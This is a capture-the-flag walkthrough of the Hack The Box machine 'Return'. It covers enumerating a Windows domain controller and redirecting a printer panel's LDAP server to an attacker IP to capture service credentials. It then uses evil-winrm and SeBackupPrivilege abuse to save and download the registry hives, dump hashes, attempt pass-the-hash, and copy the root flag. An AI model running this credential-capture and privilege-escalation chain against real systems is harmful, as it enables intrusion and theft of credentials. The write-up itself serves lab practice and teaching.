# Return: Easy

```sh
sudo vim /etc/hosts
# add return.htb

nmap -T4 -p- -A -Pn -v return.htb
```

* open ports & services:

    * 53/tcp: domain: Simple DNS Plus
    * 80/tcp: http: Microsoft IIS httpd 10.0
    * 88/tcp: kerberos-sec: Microsoft Windows Kerberos
    * 135/tcp: msrpc: Microsoft Windows RPC
    * 139/tcp: netbios-ssn: Microsoft Windows netbios-ssn
    * 389/tcp: ldap: Microsoft Windows Active Directory LDAP
    * 445/tcp: microsoft-ds
    * 464/tcp: kpasswd5
    * 593/tcp: ncacn_http: Microsoft Windows RPC over HTTP 1.0
    * 636/tcp: tcpwrapped
    * 3268/tcp: ldap: Microsoft Windows Active Directory LDAP
    * 3269/tcp: tcpwrapped
    * 5985/tcp: http: Microsoft HTTPAPI httpd 2.0
    * 9389/tcp: mc-nmf: .NET Message Framing
    * 47001/tcp: http: Microsoft HTTPAPI httpd 2.0

* the ```nmap``` sccan gives the domain 'return.local' for LDAP: we can add this in ```/etc/hosts```

* the webpage on port 80 is titled 'HTB Printer Admin Panel'; it contains a link for 'Settings' to '/settings.php'

* the Settings page contains the following setting fields that can be updated:

    * server address: 'printer.return.local'
    * server port: 389
    * username: svc-printer
    * password: '*******'

* the settings fields seem to be for LDAP, as the port is 389

* we can update the server address 'printer.return.local' in ```/etc/hosts``` - this subdomain also leads to the same admin panel page

* we can check the other open services first before modifying the LDAP fields

* enumerating RPC & SMB:

    ```sh
    rpcclient -U "" return.htb
    # NT_STATUS_LOGON_FAILURE

    rpcinfo -p return.htb
    # connection refused

    smbmap -H return.htb
    # no info

    enum4linux-ng return.htb -A
    # no useful info

    smbclient -N -L //return.htb
    # no shares

    crackmapexec smb return.htb --shares -u '' -p ''
    # STATUS_ACCESS_DENIED

    crackmapexec smb return.htb --shares -u 'Guest' -p ''
    # STATUS_ACCOUNT_DISABLED
    ```

* enumerating LDAP:

    ```sh
    ldapsearch -x -H ldap://return.htb -s base namingcontexts
    # -x for simple auth
    # -H for LDAP URI
    # -s for scope - 'base'

    # this gives us naming contexts like 'DC=return,DC=local'
    # we can use this

    ldapsearch -x -H ldap://return.htb -b 'DC=return,DC=local'
    # -b for search base
    # authentication error
    ```

* trying to enumerate LDAP further gives us an error: "In order to perform this operation a successful bind must be completed on the connection"

* Googling on this error shows that this error is because binding (login) is required

* now, as we have a possible option to configure LDAP username & password in the Settings page on 'http://return.htb/settings.php', we can try to change the creds and then use it in ```ldapsearch```

* we can navigate to the Settings page, and try to change the username to 'testuser', and change the password to something like 'TestPass123!'

* we can also intercept the request in Burp Suite to see how the request is made

* when we click on 'Update', we can see that the POST request to '/settings.php' contains only the IP field in the data: 'ip=printer.return.local': and no actual changes to any of the fields are made

* we can try passing in the 'username' and 'password' fields in the POST data, but that does not work

* as the only field that is being passed in the POST request is the 'ip' field, we can try modifying it to include our IP, and we can setup a listener on port 389 to check for any LDAP-related communication:

    ```sh
    sudo nc -nvlp 389
    # setup listener
    ```

* if we submit the attacker IP as the server address in the Settings page, on our listener we get some LDAP data: the username 'return\svc-printer' and a password string '1edFg43012!!' is mentioned

* we can check if these are valid LDAP creds by using it in ```ldapsearch```:

    ```sh
    ldapsearch -x -D 'svc-printer@return.htb' -w '1edFg43012!!' -H ldap://return.htb -b 'DC=return,DC=local'
    # -D for distinguished name
    # -w for password

    # this gives the error 'invalid credentials'
    # test with LDAP domain 'return.local'

    ldapsearch -x -D 'svc-printer@return.local' -w '1edFg43012!!' -H ldap://return.htb -b 'DC=return,DC=local'
    # this works, and gives a lot of output

    # save the output to a file
    ldapsearch -x -D 'svc-printer@return.local' -w '1edFg43012!!' -H ldap://return.htb -b 'DC=return,DC=local' > ldapoutput

    less ldapoutput
    ```

* ```ldapsearch``` works and we are able to fetch info: we can enumerate it for any secrets

* the LDAP output does not contain any secrets or any useful info, but it does show that the 'svc-printer' user could be part of 'Remote Management Users' group

* so, we can try using these creds for WinRM login:

    ```ps
    evil-winrm -u svc-printer -p '1edFg43012!!' -i return.htb
    # this works

    pwd
    # 'C:\Users\svc-printer\Documents'

    cd ..

    dir Desktop

    type Desktop\user.txt
    # user flag

    whoami /priv
    ```

* checking the privileges using ```whoami /priv```, SeBackupPrivilege & SeRestorePrivilege are enabled: which is not default

* [these privileges can be exploited to extract hashes](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/):

    ```ps
    # save and download the hives

    reg save hklm\sam C:\Windows\Temp\sam

    reg save hklm\system C:\Windows\Temp\system

    download C:\Windows\Temp\sam /home/svheartvsnares/sam

    download C:\Windows\Temp\system /home/svheartvsnares/system
    ```

    ```sh
    # on attacker
    # we can extract hashes using secretsdump

    secretsdump.py -sam sam -system system LOCAL
    # this gives hashes for Administrator

    # using PtH in evil-winrm
    evil-winrm -u Administrator -H 34386a771aaca697f447754e4863d38a -i return.htb
    # this does not work

    # we can try PtH in psexec
    psexec.py Administrator@return.htb -hashes :34386a771aaca697f447754e4863d38a
    # this also does not work
    ```

* the extracting hash method does not work in this case, so we can try another approach: [SeBackupPrivilege can be used to read sensitive files](https://exploitnotes.org/exploit/windows/privilege-escalation/sebackupprivilege#exploitation-read-sensitive-files):

    * [download the SeBackupPrivilege abuse DLLs: SeBackupPrivilegeCmdLets.dll & SeBackupPrivilegeUtils.dll](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)

    * upload the DLLs to target: in ```evil-winrm``` we can use the 'upload' command:

        ```ps
        upload SeBackupPrivilegeCmdLets.dll

        upload SeBackupPrivilegeUtils.dll
        ```
    
    * import the malicious modules:

        ```ps
        Import-Module .\SeBackupPrivilegeCmdLets.dll

        Import-Module .\SeBackupPrivilegeUtils.dll

        Set-SeBackupPrivilege

        Get-SeBackupPrivilege
        ```
    
    * now we can copy the sensitive files:

        ```ps
        Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\Users\svc-printer\Documents\root.txt -Overwrite
        # copy root flag

        type C:\Users\svc-printer\Documents\root.txt
        # this gives root flag
        ```
